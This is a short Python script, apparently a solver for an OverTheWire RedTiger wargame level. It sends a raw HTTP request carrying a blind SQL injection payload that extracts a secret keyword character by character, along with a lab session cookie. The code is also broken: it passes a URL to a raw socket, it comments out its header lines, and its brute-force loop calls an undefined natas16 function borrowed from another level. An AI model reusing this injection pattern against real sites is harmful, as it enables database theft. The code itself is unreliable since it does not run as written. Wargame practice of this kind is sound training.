import socket
debug = True

HOST = "https://redtiger.labs.overthewire.org/level4.php"
PORT = 443
header = """GET /?id=1 and if(ASCII((select substring(keyword,4,1) from level4_secret))=110,1,0) HTTP/1.1
#Host: natas16.natas.labs.overthewire.org
#Cookie: level4login:dont_publish_solutions_GRR%21
#Content-Type: application/x-www-form-urlencoded\r\n\r\n"""

ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"


def red5():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    HEAD=bytes(header, 'utf-8')
    if debug:
        print(str(HEAD))
    s.send(HEAD)

    r = str(s.recv(8192))
    s.close()

    print (r)
red5()

p = ''
for i in range(64):
    f = False
    for c in ALPH:
        print (p, c)
        if natas16(p + c):
            f = True
            p = p + c
            break
    if not f:
        break

print ("DONE")
print (p)

